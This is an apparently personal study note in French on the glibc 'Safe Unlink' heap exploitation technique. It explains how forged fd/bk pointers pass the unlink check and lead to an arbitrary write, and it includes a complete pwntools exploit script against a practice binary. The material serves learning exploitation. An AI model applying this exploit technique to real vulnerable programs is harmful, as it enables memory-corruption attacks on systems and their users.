---
title: 'Safe Unlink'
date: 2023-02-20
draft: true
description: "fa-solid fa-trash-can fa-fw fa-sm"
categories:
  - heap
  - attacks
tags:
  - pwn
  - heap
---

## Overview
Tout comme pour l'Unsafe Unlink, l'objectif de cette attaque est d'exploiter la manière dont sont consolidés les chunks dans [l'Unsorted Bin](Pwn/Heap/Bins#Unsorted%20Bins). La différence étant que le Safe Unlink vérifie que le chunk unlink est bien un chunk utilisé. C'est donc une attaque adaptée aux version modernes de la GLIBC et fonctionne même avec la présence du NX/DEP.
## Detail
Il y a 2 mitigations qui rendent l'Unsafe Unlik obsolète. Tout d'abord, la présence évidente du NX/DEP. De plus, une mitigation sur la procédure du unlink est maintenant implémentée. Cette protection vérifie que les **fd/bk** des chunks affectés par l'unlink pointent bien les uns vers le même chunk à unlink. 
![[Pasted image 20240110161831.png]]

On a donc un check sur la validité de la linked list. Ou presque...
Enfait le check vérifie que le fd et le bk du chunk qu'on essaye d'unlink pointent bien vers ce chunk.
![[Pasted image 20240112143517.png]]

Or, l'adresse des chunks est sauvegardée en mémoire, donc si on arrive à trouver l'adresse de ce pointeur, alors on pourra changer la valeur de ce pointeur et obtenir un arbitrary write.
![[Pasted image 20240112145403.png]]

L'attaque se passe donc en 2 étapes, obtenir un reflected write (on ne contrôle pas la valeur écrite), puis un arbitrary write.
### Step 1:
La première étape consiste à passer le unlinking check. Pour ça on va donc utiliser l'array qui save l'adresse du chunk. 
Pour la valeur de fd, on va la set à **m_array-0x18** puisque c'est le bk qui doit contenir l'adresse du chunk_A. Et pour la valeur de bk, on va la set à **m_array-0x10** puisque c'est le fd qui doit contenir l'adresse de chunk_A.

Une fois cela fait, on maintenant avoir, 2 fake chunks valides qui seront linked au chunk_A. Enfin pas tout à fait. Enfait, le m_array pointe vers les user_data du chunk_A, donc pas le chunk_A. Il faut donc trouver un moyen de modifier les metadata du chunk_A pour décaler le début 0x10 bytes plus loin.

Une fois l'unlink fait, l'adresse de **m_array-0x18** va overwrite l'adresse du chunk unlink.
### Step 2:
La référence à notre chunk initial sera donc overwrite par l'adresse de **m_array-0x18**. Ce qui va donc nous donner un chunk à l'adresse de **m_array-0x18**. Ainsi, en modifiant les user_data du chunk, on va pouvoir overwrite à nouveau l'adresse de **m_array** et ainsi obtenir un arbitrary write.

### Exploit
```python title:exploit.py
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("safe_unlink")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Select the "free" option; send index.
def free(index):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# Request 2 small chunks, the first must be large enought to fit a fake small chunk inside it.
overflow = malloc(0x88)
victim = malloc(0x88)

# Prepare fake chunk metadata.
# A correct size field satisfies the size vs prev_size checks.
fake_chunk_header = p64(0) + p64(0x81)

# Set the fd such that the bk of the "chunk" it points to is the first entry in m_array.
fd = elf.sym.m_array - 0x18

# Set the bk such that the fd of the "chunk" it points to is also the first entry in m_array.
bk = elf.sym.m_array - 0x10

# Set the prev_size field of the next chunk to the actual previous chunk size - 0x10.
prev_size = 0x80

# Write the fake chunk metadata to the "overflow" chunk.
# Overflow into the succeeding chunk's size field to clear the prev_inuse flag.
edit(overflow, fake_chunk_header + p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(0x90))

# Free the "victim" chunk to trigger backward consolidation with the "overflow" chunk.
free(victim)

# After unlinking, the first entry in m_array points 0x18 bytes before m_array itself.
# Use the "edit" option to overwrite the first entry in m_array again with the address of the target data.
edit(0, b"X"*0x18 + p64(elf.sym.target))

# Use the "edit" option once more to overwrite the target data.
edit(0, b"Much win!")

# Check that the target data was overwritten.
io.sendthen(b"target: ", b"4")
target_data = io.recvuntil(b"\n", True)
assert target_data == b"Much win!"
io.recvuntil(b"> ")

# =============================================================================

io.interactive()
```
## Further use
Ici, la technique a été décrite dans le cas d'une backward consolidation, mais il est tout a fait possible de le faire également en forward.
## Limitations
Une check sur la size et le prev_size à été ajouté à la version 2.26 de la GLIBC. Il necessite que l'adresse du chunk+size soit égale au size field.
